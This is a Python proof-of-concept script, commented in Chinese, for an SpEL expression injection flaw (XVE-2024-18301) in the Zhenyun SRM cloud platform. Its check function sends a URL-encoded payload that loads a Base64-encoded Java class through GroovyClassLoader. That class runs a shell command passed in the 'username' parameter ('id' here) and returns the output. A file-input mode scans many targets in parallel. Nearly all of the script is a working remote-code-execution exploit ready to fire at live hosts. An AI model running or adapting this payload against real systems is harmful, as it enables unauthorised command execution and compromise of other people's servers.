import requests
import argparse
from multiprocessing import Pool
import urllib.parse

requests.packages.urllib3.disable_warnings()


def main():
    parser = argparse.ArgumentParser(description='甄云SRM云平台 SpEL表达式注入漏洞(XVE-2024-18301)POC检测脚本')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url!')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file!')
    args = parser.parse_args()
    pool = Pool(20)
    if args.url:
        target = format_url(args.url)
        check(target)
    elif args.file:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for line in f.readlines():
                    line = line.strip()
                    target = format_url(line)
                    targets.append(target)
            pool.map(check, targets)
            pool.close()
            pool.join()  # 添加join，确保进程池任务执行完毕并正确释放资源
        except FileNotFoundError:
            print(f"文件 {args.file} 不存在，请检查路径是否正确")
        except PermissionError:
            print(f"没有权限打开文件 {args.file}")
        except Exception as e:
            print(f"读取文件出现其他异常: {e}")


def check(target):
    target = format_url(target)
    p_target = target
    target = target + '/oauth/public/%5f%5f%24%7bT(groovy.lang.GroovyClassLoader).newInstance().defineClass("CALC",T(com.sun.org.apache.xml.internal.security.utils.Base64).decode("yv66vgAAADQAqwoAJABOCgBPAFAHAFEKAAMAUgoAAwBTCwBUAFUIAD8LAFYAVwcAWAoAWQBaCgBbAFwKAAkAXQgAXgoAXwBgCgAJAGEIAGIKAAkAYwgAZAgAZQgAZggAZwoAaABpCgBoAGoKAGsAbAcAbQoAGQBuCABvCgAZAHAKABkAcQoAGQByCABzCgB0AHUKAHQAdgoAdAB3BwB4BwB5AQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAAR0aGlzAQAGTENBTEM7AQACc3IBAEJMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlczsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQALcHJpbnRXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAh1c2VybmFtZQEADVN0YWNrTWFwVGFibGUHAHgHAFEHAHoHAHsHAHwHAFgHAC8HAH0HAG0BAApFeGNlcHRpb25zBwB%2bAQAKU291cmNlRmlsZQEACUNBTEMuamF2YQwAJQAmBwBxxxxDACAAIEBAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDACCAIMMAIQAhQcAewwAhgCHBwB6DACIAIkBABBqYXZhL2xhbmcvU3RyaW5nBwCKDACLAI4HAI8MAJAAkQwAJQCSAQAHb3MubmFtZQcAkwwAlACJDACVAJYBAAN3aW4MAJcAmAEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAJkMAJoAmwwAnACdBwCeDACfAKABABFqYXZhL3V0aWwvU2Nhbm5lcgwAJQChAQACXGEMAKIAowwApAClDACmAJYBAAAHAHwMAKcAqAwAqQAmDACqACYBAARDQUxDAQAQamF2YS9sYW5nL09iamVjdAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFKFtCKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAjACQAAAAAAAEAAQAlACYAAgAnAAACGAAEAAwAAADZKrcAAbgAAsAAA0wrtgAETSu2AAVOLbkABgEAOgQsEge5AAgCADoFGQXGAKW7AAlZuAAKGQW2AAu3AAw6BQQ2BhINuAAOOgcZB8YAExkHtgAPEhC2ABGZAAYDNgYVBpkAGQa9AAlZAxISU1kEEhNTWQUZBVOnABYGvQAJWQMSFFNZBBIVU1kFGQVTOgi4ABYZCLYAF7YAGDoJuwAZWRkJtwAaEhu2ABw6ChkKtgAdmQALGQq2AB6nAAUSHzoLGQQZC7YAIBkEtgAhGQS2ACIZBLYAIRkEtgAisQAAAAMAKAAAAFoAFgAAAAwABAAOAAsADwAQABAAFQARAB0AEwAnABQALAAWAD0AGABAABkARwAaAFkAGwBcAB4AjAAfAJkAIACpACEAvQAiAMQAIwDJACQAzgAnANMAKADYACkAKQAAAHoADABAAI4AKgArAAYARwCHACwALQAHAIwAQgAuAC8ACACZADUAMAAxAAkAqQAlADIAMwAKAL0AEQA0AC0ACwAAANkANQA2AAAACwDOADcAOAABABAAyQA5ADoAAgAVAMQAOwA8AAMAHQC8AD0APgAEACcAsgAxxxxAC0ABQBAAAAATQAGxxxxwBcAAgHAEEHAEIHAEMHAEQHAEUHAEYBBwBGAAAaUgcARxxxx4ALgcARwcASAcASUEHAEbxxxxABIABgcAQQcAQgcAQwcARAcARQcARgAAAEoAAAAEAAEASwACAEwAAAACAE0AjQAAAAoAAQBbAFkAjAAJ".replace("xxxx",new%20String(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode("Lw=="))))).newInstance()-1%7d%5f%5f%3a%3a%78/ab?username=aWQ='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }


    try:
        response = requests.get(url=target, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'uid' in response.text:
            print(f"[+]{p_target} is vulnerable!")
        else:
            print(f"[-]{p_target} is not vulnerable!")
    except requests.exceptions.Timeout:
        print(f"[-]{p_target} 超时")
    except requests.exceptions.RequestException as e:
        print(f"[-]{p_target}出现请求异常!")


def format_url(url):
    # 去除 URL 首尾的空白字符
    url = url.strip()
    """格式化URL，补充协议头，添加路径，确保URL格式规范"""
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme:
        return 'http://' + url
    return url


if __name__ == '__main__':
    main()